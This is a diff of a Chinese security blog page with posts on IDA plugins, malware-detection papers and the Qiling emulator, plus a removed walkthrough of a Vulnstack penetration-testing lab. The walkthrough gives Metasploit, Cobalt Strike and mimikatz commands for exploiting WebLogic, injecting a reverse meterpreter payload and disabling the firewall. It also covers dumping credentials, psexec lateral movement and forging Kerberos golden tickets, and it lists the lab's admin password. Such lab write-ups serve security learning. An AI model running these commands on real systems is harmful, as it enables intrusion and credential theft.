+<p>IDA插件也可以安装到%APPDATA%\Roaming\Hex-Rays\IDA Pro\plugins目录下，目录结构如下</p>
+<blockquote>
+<p>plugins</p>
+<blockquote>
+<p>plugin_script</p>
+<blockquote>
+<p>plugin_script_impl.py</p>
+<p>__init__.py</p>
+</blockquote>
+</blockquote>
+<p>plugin_script.py</p>
+</blockquote>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://www.52pojie.cn/thread-1198722-1-1.html">https://www.52pojie.cn/thread-1198722-1-1.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/">https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35056292/article/details/89421793">https://blog.csdn.net/qq_35056292/article/details/89421793</a></p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
+    <article id="post-review/interview/wp" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/04/review/interview/wp/" class="article-date">
+  	<time datetime="2021-01-04T12:11:41.000Z" itemprop="datePublished">2021-01-04</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/04/review/interview/wp/">
+        面试获得的感想
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>CTF一定要实战，光刷题学不到新知识，而且很容易忘掉。</p>
+<p>可用于实战的逆向：</p>
+<ol>
+<li><p>病毒分析</p>
+</li>
+<li><p>外挂开发</p>
+</li>
+<li><p>IDA插件</p>
+</li>
+</ol>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-note/web/pentist-3" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -557,475 +906,6 @@
         <p>做出了rex1和密码x1，我太菜了，雪殇yyds</p>
 <p>直接贴雪殇的链接好了(～￣▽￣)～</p>
 <p><a target="_blank" rel="noopener" href="http://snowywar.top/wordpress/index.php/2020/12/25/bjd4th-writeup/">http://snowywar.top/wordpress/index.php/2020/12/25/bjd4th-writeup/</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/rev/android-database-decryption" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/12/07/note/rev/android-database-decryption/" class="article-date">
-  	<time datetime="2020-12-07T11:06:30.000Z" itemprop="datePublished">2020-12-07</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/07/note/rev/android-database-decryption/">
-        高版本Android数据库加密分析
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Android系统采用SQLite数据库，应用数据库存储在/data/data/报名/databases目录下</p>
-<p>相关API为</p>
-<ul>
-<li>SQLiteOpenHelper</li>
-<li>-getReadableDatabase</li>
-<li>-getWritableDatabase</li>
-</ul>
-<p>相关资料</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://source.android.com/security/encryption/file-based">https://source.android.com/security/encryption/file-based</a></li>
-<li><a target="_blank" rel="noopener" href="https://source.android.com/security/encryption/metadata">https://source.android.com/security/encryption/metadata</a></li>
-<li><a target="_blank" rel="noopener" href="https://source.android.com/security/trusty">https://source.android.com/security/trusty</a></li>
-</ul>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/web/pentist-2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/12/05/note/web/pentist-2/" class="article-date">
-  	<time datetime="2020-12-05T10:24:46.000Z" itemprop="datePublished">2020-12-05</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/12/05/note/web/pentist-2/">
-        靶机看答案渗透记录-2
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>参考资料 <a target="_blank" rel="noopener" href="https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/">https://cyzcc.vip/2020/07/14/Vulnstack%E4%BA%8C/</a></p>
-<p>靶场地址 <a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>按照靶机说明把攻击机和WEB，PC放在同一网段内，WEB，PC，DC有私有网段</p>
-<p>管理员域\账户/密码是 DE1AY\Administrator/1qaz@WSX</p>
-<p>WEB机在C:\Oracle\Middleware\user_projects\domains\base_domain中有个startWebLogic，以管理员身份运行</p>
-<p>PC，WEB机计算机右键-&gt;管理-&gt;配置-&gt;服务-&gt;Server, Workstation, Computer Brower全部启动</p>
-<h2 id="外网渗透"><a href="#外网渗透" class="headerlink" title="外网渗透"></a>外网渗透</h2><ol>
-<li><p>nmap扫一下对应网段，得到靶机地址，得到开放端口。有个7001端口，无论搜端口还是搜服务信息都是WebLogic。</p>
-</li>
-<li><p>使用WebLogicscan进行扫描</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 WebLogicscan.py -u ip -p 7001</span><br></pre></td></tr></table></figure>
-<p>搜索到一个JAVA反序列化漏洞CVE-2019-2725</p>
-<p>网上查找漏洞利用信息，找到一个msf模块 exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p>
-<p><a target="_blank" rel="noopener" href="https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725">https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-2725</a></p>
-</li>
-<li><p>利用模块，需要设置target,LHOST,RHOSTS，可以使用show options,show targets查看相关选项</p>
-</li>
-<li><p>获取到了shell</p>
-</li>
-</ol>
-<p>ctrl+z可以放后台</p>
-<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>cabaltstrike工具的使用</p>
-<ol>
-<li>建立teamserver ./teamserver 本机IP 连接密码</li>
-<li>启动cabaltstrike客户端，需要java8。连接teamserver。</li>
-<li>工具栏有个耳机图标，单击然后建立一个新的监听，监听4445端口</li>
-</ol>
-<p>msf进行如下操作</p>
-<ol>
-<li>use exploit/windows/local/payload_inject</li>
-<li>set payload windows/meterpreter/reverse_http</li>
-<li>set DisablePayloadHandler true</li>
-<li>set lhost ip</li>
-<li>set lport 4445 </li>
-<li>set session 1</li>
-<li>exploit</li>
-</ol>
-<p>这时再查看CS，已经连接上靶机了</p>
-<p>右键进入beacon界面即可执行命令(右键-&gt;interact)</p>
-<p>要执行shell命令直接在命令之前加shell，如shell dir</p>
-<ol>
-<li><p>创建监听器用于木马回连</p>
-</li>
-<li><p>Attacks-&gt;Packages-&gt;Windows Executable根据靶机类型勾选生成木马</p>
-</li>
-<li><p>在msf session中使用upload命令上传</p>
-<p>sessions 2</p>
-<p>upload /home/kali/Downloads/artifact.exe C:\Oracle\Middleware\user_projects\domains\base_domain\artifact.exe</p>
-</li>
-<li><p>execute命令执行木马，-H 不可见,-i交互</p>
-<p>execute -H -i -f artifact.exe</p>
-</li>
-<li><p>凭证获取</p>
-<p>在木马连接右键-&gt;access-&gt;dump hashes</p>
-<p>右键-&gt;access-&gt;run mimikatz</p>
-<p>再点击凭证信息</p>
-</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>右键-&gt;Access-&gt;提权Elevate</p>
-<p>ms14-058</p>
-<p>成功提升为system权限</p>
-<h2 id="域信息搜集"><a href="#域信息搜集" class="headerlink" title="域信息搜集"></a>域信息搜集</h2><ol>
-<li><p>获取当前组名 shell net view 需关闭靶机防火墙，否则出错</p>
-<blockquote>
-<p>第一种 msf&gt; run post/windows/manage/enable_rdp<br>第二种 菜刀命令输入 netsh advfirewall set allprofiles state off</p>
-</blockquote>
-</li>
-<li><p>查看所有域 net view /domain</p>
-</li>
-<li><p>查看IP信息 ipconfig /all</p>
-</li>
-<li><p>查看域名 shell net config workstation</p>
-</li>
-<li><p>查看域内机器IP</p>
-<p>net view</p>
-</li>
-<li><p>查询域控机器</p>
-<p>shell net group “Domain Controllers” /domain</p>
-</li>
-<li><p>查询域管理员</p>
-<p>shell net group “domain admins” /domain</p>
-</li>
-</ol>
-<h2 id="psexec-传递"><a href="#psexec-传递" class="headerlink" title="psexec 传递"></a>psexec 传递</h2><p>传递登陆的概念</p>
-<p>获取凭据后对模板网段进行活端口检测，因为是传递登陆，多以仅需检测445端口</p>
-<p>portscan ip网段 端口 协议 线程</p>
-<p>portscan 10.10.10.0/24 445 arp 200</p>
-<p>view-&gt;Targets查看端口探测后的存活主机</p>
-<p>新建Listener，Payload选择windows/beacon_smb/bind_pipe</p>
-<p>存活主机右键-&gt;Login-&gt;psexec，选择之前后去的凭据信息，选择Listener以及主机Session</p>
-<p>使用相同的方法让PC上线</p>
-<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>在域控中获取KRBTGT账户NTLM密码hash和SID hashdump</p>
-<p>黄金票据</p>
-<p>WEB机Administrator -&gt;右键-&gt; Access-&gt;Golden Ticket</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域是Windows管理本地网络的一组计算机，是Windows网络中的独立运行的单位</p>
-<p>域管理员可以设置组策略，域成员会统一应用这一组策略。可以统一安装软件，统一配置计算机</p>
-<p>只有Windows专业版和企业版可以连接到域</p>
-<p><strong>域控制器</strong>(DC)是域中负责控制的计算机，负责验证连入域网络计算机的验证工作，至少一台</p>
-<p>域环境中也有DNS，DNS负责支持DC，也负责帮助人找到DC</p>
-<p>域内计算机之间建立了信任关系，在域内访问其它机器，无需再被许可</p>
-<p>AD域</p>
-<h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>工作组中的每一台计算机独立管理自己资源，无法统一管理资源；一个账户只能登陆一台计算机；计算机之间是平等的；每一个计算机都在本地存储用户账户；规模一般小于10台计算机</p>
-<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>认证过程中，client与Kerberos服务器(Access Server)同心会得到TGT，带着TGT请求TGS，得到票据ticket，就可以访问应用服务器。</p>
-<p>黄金票据就是自己生成的TGT，生成过程中user,domain,timestamp和权限会经过krbtgt账户hash加密，所以有这些信息就可以生成票据。krbtgt账户不自动更新的，krbtgt需要域管理权限。有了黄金票据，就免除了向AS验证用户名和密码的阶段。</p>
-<p><strong>winlogin.exe</strong> 接收用户名，密码，域信息，传递给lsass.exe</p>
-<p><strong>lsass.exe</strong> 把经过kerberos处理的用户名密码域SAM进行对比验证，返回结果</p>
-<p><strong>SAM数据库</strong> 存储账号和密码hash的数据库</p>
-<p><strong>NetLogin</strong> 域认证加密信道</p>
-<p>查看域</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure>
-
-<p>查看账号信息簇，生成，导入都需要mimikatz</p>
-<p>检验缓存票据</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure>
-<p>利用票据访问</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\xx.domain-name</span><br></pre></td></tr></table></figure>
-
-<h3 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h3><p>是伪造的TGS，只能访问特定的服务器</p>
-<p>使用mimikatz生成，导入，管理等</p>
-<h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>可以从lsass.exe处获取账号密码，或从文件中找到密码哈希值</p>
-<p>设置特权 privilege::debug</p>
-<p>获取本机用户名，口令，sid等，导出域 sekurlsa::logonpasswrods</p>
-<p>获得域控权限 需要ms14-068漏洞 ms14-068 -u -p -s -d</p>
-<p>生成缓存，导入伪造缓存 kerberos::ptc test.cache</p>
-<p>登陆：net use 导入的缓存</p>
-<p>导出lsass.dump sekurlsa::minidump lsass.dump<br>sekurlsa::logonPasswords full</p>
-<p>导出所有用户口令 lsadump::sam SYSTEM.hiv SAM.hiv</p>
-<p>net use \A-635ECAEE64804.TEST.LOCAL mimikatz /user：test</p>
-<p>生成黄金票据</p>
-<p>kerberos::golden /user:Administrator /domain:test.local/sid:S-1-5-21-2848411111-3820811111-1717111111/krbtgt:d3b949b1f4ef947820f0950111111111 /ticket:test.kirbi</p>
-<p>？？刷新扫雷记录？ minesweeper::Infos</p>
-<p>参考：<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a3ddd7502c09">https://www.jianshu.com/p/a3ddd7502c09</a></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/papers/1-1" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/11/27/note/papers/1-1/" class="article-date">
-  	<time datetime="2020-11-27T15:40:06.000Z" itemprop="datePublished">2020-11-27</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/27/note/papers/1-1/">
-        app行为的语义提取方案读论文笔记
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>语义提取首先要定义语义，比如说一个软件的行为有无恶意，有恶意和无恶意就是语义。然后才可以在软件中提取信息，整合信息，判断是否具有这些语义。或者可以判断两个软件是否具有相同语义。</p>
-<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><a target="_blank" rel="noopener" href="http://www.jos.org.cn/jos/ch/reader/create_pdf.aspx?file_no=3953&journal_id=jos">基于语义的恶意代码行为特征提取及检测方法</a></p>
-<p>恶意代码总是会有各种混淆以干扰分析，并且还会有变种。比如说插入垃圾行为，插入垃圾代码。这时如果从一个更高的抽象层次去分析，就可以抵抗这些干扰。于是就引入了语义特征分析。</p>
-<blockquote>
-<p>现有的分析方法难于抵抗代码混淆，特征库庞大，在于分析方案无法分析出恶意代码的根本意图</p>
-</blockquote>
-<p>这篇论文的参考资料8-10是行为语义相关的。</p>
-<p>主要通过数据依赖和控制依赖，行为图构建，语义特征分析来分析恶意代码的行为，主要阐述了语义无关和语义等价两类混淆技术。</p>
-<p>先进行动态污点传播分析</p>
-<p>然后是行为依赖图的构建：</p>
-<ol>
-<li>行为依赖图初始化为空</li>
-<li>遇到产生污点的关键系统调用，添加节点</li>
-<li>遇到新的系统调用时，如果传入参数包含污点数据，则将其添加为节点<ul>
-<li>这里注意通过DFA将系统调用序列等价为某一个系统调用</li>
-</ul>
-</li>
-<li>依赖图的添加是通过添加新节点时回溯计算污点传播过程完成的<br>对于控制流转移的问题，采用递归下降反汇编算法</li>
-<li>当污点漂白或恶意代码执行结束，行为图构建结束</li>
-</ol>
-<p>语义等价通过等价库解决，语义无关有相应的提取方案。</p>
-<p>对于语义无关调用，通过污点分析分析相关调用对系统的状态是否产生影响，系统状态定义为操作系统的完整性和数据安全性。语义无关系统调用在行为图中定义为没有使系统状态产生改变的节点；将循环替换为一次执行信息</p>
-<p>最后构建一个恶意代码行为图特征库，匹配系统调用，边，节点，并且为不同的匹配元素设置不同的权值，最后一个加权平均获得最后的[0,1]的值，并且涉资一个阈值，超过阈值就认为是恶意代码。</p>
-<p>阈值设置是基于实验结果的。</p>
-<blockquote>
-<p>通过对行为层混淆技术的分析,我们从语义角度将其分为语义无关调用插入和语义等价调用变换两类.语义无关调用插入是指恶意代码中常加入一些与其意图无关没有无实际作用的系统调用,目的是改变代码特征,我们从语义角度将其称为语义无关调用.语义等价调用变换主要是指通过等价系统调用替换、循环变换等方式改变执行行为的系统调用序列,从而改变特征.等价系统调用序列是指行为相同的不同系统调用序列,将其互相替换,便可在不改变行为的前提下改变特征.循环变换即指改变操作粒度,将同样的行为分割为不同循环而产生不同图特征的混淆方式.这两种混淆方法的共同特点是,在保持恶意代码行为意图即代码语义的条件下,通过等价替换改变特征,我们将此类变换统称为语义等价调用变换</p>
-</blockquote>
-<p>7-10参考资料可能有语义分析</p>
-<blockquote>
-<p>[7] Sathyanarayan VS, Kohli P, Bruhadeshwar B. Signature generation and detection of malware families. In: Proc. of the 13th<br>Austalasian Conf. on Information Security and Privacy. Wollongong, 2008. 336−349. [doi: 10.1007/978-3-540-70500-0_25]<br>[8] Christodorescu M, Jha S, Seshia SA, Song DX, Bryant RE. Semantics-Aware malware detection. In: Proc. of the 2005 IEEE Symp.on Security and Privacy. 2005. 32−46. [doi: 10.1109/SP.2005.20]<br>[9] Preda MD, Christodorescu M, Jha S, Debray S. A semantics-based approach to malware detection. In: Proc. of the Symp. onPrinciples of Programming Languages. New York: ACM Press, 2007. 377−388. [doi: 10.1145/1190216.1190270]<br>[10] Kinder J, Katzenbeisser S, Schallhart C, Veith H. Detecting malicious code by model checking. In: Proc. of the 2nd Int’l Conf. onIntrusion and Malware Detection and Vulnerability Assessment (DIMVA 2005). LNCS 3548, Vienna: Springer-Verlag, 2005.174−187. [doi: 10.1007/11506881_11] </p>
-</blockquote>
-<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><a target="_blank" rel="noopener" href="https://xueshu.baidu.com/usercenter/paper/show?paperid=dd2172d9cc4bf41dbc92641acce1ea1a&amp;site=xueshu_se">https://xueshu.baidu.com/usercenter/paper/show?paperid=dd2172d9cc4bf41dbc92641acce1ea1a&amp;site=xueshu_se</a></p>
-<p>Android系统下混淆恶意软件的检测研究</p>
-<p>基于source-sink的语义特征的提取与加工处理：从程序中提取从source到sink的数据流，使用自定义的处理器进行处理，产生最终的特征</p>
-<p>source即敏感信息，sink即将敏感信息泄露的API调用。然后进行格式化，找到恶意软件家族最常用的特征。</p>
-<p>API调用的语义特征，权限，linux命令</p>
-<p>flowdroid提取source-sink流,apktool提取权限特征</p>
-<p><img src="/.com//2-1.PNG"></p>
-<p>后面是用机器学习的方式进行分类的</p>
-<p><img src="/.com//2-2.PNG"></p>
-<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><p>因为看到前面的方案都有污点分析的方法，所以找了找污点分析的文献综述</p>
-<p>污点分析技术的原理和实践应用<br><a target="_blank" rel="noopener" href="https://xueshu.baidu.com/usercenter/paper/show?paperid=be0648c3bf970bf4977b893e2089f8d7&amp;site=xueshu_se">https://xueshu.baidu.com/usercenter/paper/show?paperid=be0648c3bf970bf4977b893e2089f8d7&amp;site=xueshu_se</a></p>
-<p>之前看过的，介绍了污点分析的现状，相关工具，分类，静态污点分析和动态污点分析的优缺点</p>
-<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><p>A Semantics-Based Approach to Malware Detection </p>
-<blockquote>
-<p>这篇文章认为识别恶意软件的关键在于语义</p>
-</blockquote>
-<p>后面没看懂了</p>
-<h2 id="5"><a href="#5" class="headerlink" title="5"></a>5</h2><p>Sentics-Aware Malware Detection</p>
-<p>定义一系列的模板，如果目标代码和已定义的模板，存在一个内存上下文，在这个内存上下文相同的情况下，对内存的影响相同，则目标代码和模板由相同的语义。模板是由自定义的语言写成的，这样就忽略了平台差异</p>
-<p>模板中的代码，在一定的状态下，产生一系列的系统调用称为事件</p>
-<p>定义J为一个恶意软件家族所具有的所有行为的模板集合，如果一个程序包含这个集合中的所有行为，则这个程序有恶意行为</p>
-<p>模板匹配程序</p>
-<p>模板T的一个节点m和程序P的一个节点n</p>
-<ul>
-<li>节点匹配：如果有函数f,f(m)=n，则说这两个节点匹配,比如说图中的4和7节点<br> <img src="/.com//5-1.PNG"></li>
-<li>边匹配：点匹配完成之后，需要确定节点中的变量在节点指令执行完成之后值是否相同</li>
-</ul>
-<h2 id="6"><a href="#6" class="headerlink" title="6"></a>6</h2><p>Semantics-Aware Android Malware Classification Using Weighted Contextual API Dependency Graphs</p>
-<p>使用Weighted Contextual API Dependency Graphs(WC-ADG)描述APP的行为</p>
-<p>带有权值和上下文的API依赖图</p>
-<blockquote>
-<p>API依赖：展示应用如何与Android框架交互</p>
-<p>上下文：在调用API时上下文</p>
-<p>常量：攻击者一般把窃取到的数据发送到指定的位置，所以和调用API有关的常量值得注意<br>API依赖图不精确匹配，因为不同的API(甚至带常量的和不带常量的)对系统安全性的影响不同，所以对于不同的API应该赋予不同的权值</p>
-</blockquote>
-<p>形式化定义：WC-ADG G=(V,E,$\alpha$,$\beta$),API操作$\Sigma$,权值空间$W$<br>符号|含义<br>–|–<br>$V$|API操作，也就是点<br>$E$|API之间的关联，也就是边<br>$\Sigma$|带有上下文的API操作<br>$\alpha$|把点对应到$\Sigma$中的一个元素<br>$\beta$|为每一个点赋权值<br>例子</p>
-<p><img src="/.com//6-1.PNG"></p>
-<p>生成图的步骤</p>
-<ol>
-<li>发现入口，入口分为被用户察觉和不被用户察觉。并且入口发现之后就可以找到参数，关联等</li>
-<li>分析数据流，交叉引用分析</li>
-</ol>
-<p>探测步骤</p>
-<ol>
-<li>生成图，然后根据已有的软件的图(没有恶意行为的)判断相似度，如果相似率小于0.3，则判断为不正常</li>
-<li>异常行为探测</li>
-<li>训练分类器<ol>
-<li>建立已有软件图的数据库，包括恶意/非恶意软件的一些小行为，移除了恶意软件和非恶意软件共有的行为</li>
-<li>给定一个待测软件，生成它的功能向量，向量的每一个元素代表数据库中的一个图，元素值代表和该图的相似度</li>
-</ol>
-</li>
-</ol>
-<h2 id="7"><a href="#7" class="headerlink" title="7"></a>7</h2><p>Detecting Malicious Code by Model Checking</p>
-<p>把控制流模型化为一个带标签的有限图</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-note/rev/qiling" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2020/11/26/note/rev/qiling/" class="article-date">
-  	<time datetime="2020-11-26T10:20:35.000Z" itemprop="datePublished">2020-11-26</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/11/26/note/rev/qiling/">
-        麒麟框架使用--官方示例
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install qiling</span><br></pre></td></tr></table></figure>
-<p>另外如果需要在windows上面执行Linux程序的话，需要copy windows的dll到linux，并且需要写一个登记</p>
-<p>官方文档说明：<br><a target="_blank" rel="noopener" href="https://docs.qiling.io/en/latest/install/">https://docs.qiling.io/en/latest/install/</a></p>
-<p>对于常用dll，直接执行examples/scripts/dllcollector.bat就可以copy了</p>
-<ol>
-<li>在linux上面模拟windows执行环境</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># sandbox to emulate the EXE</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span>(<span class="params">path, rootfs</span>):</span></span><br><span class="line">    <span class="comment"># setup Qiling engine</span></span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    <span class="comment"># now emulate the EXE</span></span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># execute Windows EXE under our rootfs</span></span><br><span class="line">    my_sandbox([<span class="string">&quot;examples\\rootfs\\x86_windows\\bin\\x86_hello.exe&quot;</span>], <span class="string">&quot;examples/rootfs/x86_windows&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li>patch程序</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_call_dialog_func</span>(<span class="params">ql</span>):</span></span><br><span class="line">    <span class="comment"># get DialogFunc address</span></span><br><span class="line">    lpDialogFunc = ql.unpack32(ql.mem.read(ql.reg.esp - <span class="number">0x8</span>, <span class="number">4</span>))</span><br><span class="line">    <span class="comment"># setup stack memory for DialogFunc</span></span><br><span class="line">    ql.stack_push(<span class="number">0</span>)</span><br><span class="line">    ql.stack_push(<span class="number">1001</span>)</span><br><span class="line">    ql.stack_push(<span class="number">273</span>)</span><br><span class="line">    ql.stack_push(<span class="number">0</span>)</span><br><span class="line">    ql.stack_push(<span class="number">0x0401018</span>)</span><br><span class="line">    <span class="comment"># force EIP to DialogFunc</span></span><br><span class="line">    ql.reg.eip = lpDialogFunc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_sandbox</span>(<span class="params">path, rootfs</span>):</span></span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    <span class="comment"># NOP out some code</span></span><br><span class="line">    ql.patch(<span class="number">0x004010B5</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x004010CD</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x0040110B</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    ql.patch(<span class="number">0x00401112</span>, <span class="string">b&#x27;\x90\x90&#x27;</span>)</span><br><span class="line">    <span class="comment"># hook at an address with a callback</span></span><br><span class="line">    ql.hook_address(force_call_dialog_func, <span class="number">0x00401016</span>)</span><br><span class="line">    ql.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    my_sandbox([<span class="string">&quot;rootfs/x86_windows/bin/Easy_CrackMe.exe&quot;</span>], <span class="string">&quot;rootfs/x86_windows&quot;</span>)</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li>模拟gdbserver</li>
-</ol>
-<p>演示程序地址<br><a target="_blank" rel="noopener" href="https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Reversing/Elf_basic">https://github.com/mzfr/ctf-writeups/tree/master/xiomara-2019/Reversing/Elf_basic</a></p>
